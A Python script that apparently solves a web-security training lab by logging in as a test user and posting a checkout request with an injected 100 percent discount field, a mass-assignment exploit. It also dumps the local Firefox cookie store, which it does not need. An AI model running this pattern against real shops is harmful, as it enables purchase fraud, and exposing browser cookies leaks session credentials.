import requests
import json
import browser_cookie3
from bs4 import BeautifulSoup

# Input URL
print("note: Please enter the url without any subdaomins or paths or parameters like http://example.com and without / at the end like http://example.com/ , just enter like http://example.com")
url = input("Enter the URL of lab:\n")
api_path = "/api/checkout"
login_path = "/login" 
login_url = url + login_path 
username = "wiener"
password = "peter"

# Headers (ensure formatting)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

csrf_token = None
session = requests.Session()


try:
    # Send a GET request to retrieve the login page and its CSRF token
    response = session.get(login_url, headers=headers)
    response.raise_for_status()  # Raise an exception for HTTP errors

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.text, "html.parser")

    # Extract the CSRF token (adjust the selector if necessary)
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    print(f"CSRF Token: {csrf_token}")

    # Prepare the payload for login
    payload = {
        "csrf": csrf_token,
        "username": username,
        "password": password
    }

    # Send the login POST request
    login_response = session.post(login_url, headers=headers, data=payload)
    login_response.raise_for_status()

    # Check if login was successful
    if login_response.status_code == 200 and "session" in session.cookies:
        print("Login successful!")
        print("Cookies after login:")
        for cookie in session.cookies:
            print(f"Cookie Name: {cookie.name}, Cookie Value: {cookie.value}")
    else:
        print("Login failed or no session cookie received.")

except requests.exceptions.RequestException as e:
    print(f"Error: {e}")

# After login, retrieve the session cookie
session_cookie_name = None
session_cookie_value = None
for cookie in session.cookies:
    if "session" in cookie.name.lower():  
        session_cookie_name = cookie.name
        session_cookie_value = cookie.value
        break

if session_cookie_name and session_cookie_value:
    print(f"Session Cookie Name: {session_cookie_name}")
    print(f"Session Cookie Value: {session_cookie_value}")


# Fetch cookies from Firefox using browser_cookie3
cookies = browser_cookie3.firefox(domain_name=login_url)
session_cookie = None
for cookie in cookies:
    print(f"Cookie from browser: {cookie.name} = {cookie.value}")  # Debug cookies
    if cookie.name == session_cookie_name:
        session_cookie = cookie.value
        break

if session_cookie:
    print(f"Session Cookie from browser_cookie3: {session_cookie}")
# Prepare headers with session cookie for API request
headers_with_cookie = {
    "Cookie": f"session={session_cookie_value}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# JSON data to send in the API request
json_data = {
    "chosen_discount": {"percentage": 100},
    "chosen_products": [{"product_id": "1", "quantity": 1}]
}

# Send the API POST request with JSON data
response = requests.post(url + api_path, headers=headers_with_cookie, json=json_data)

print(f"API LAB Response Status: {response.status_code}") 
print(response.text)  # Debugging the response body
print("if you see 201 status code, you have successfully solved the lab.")
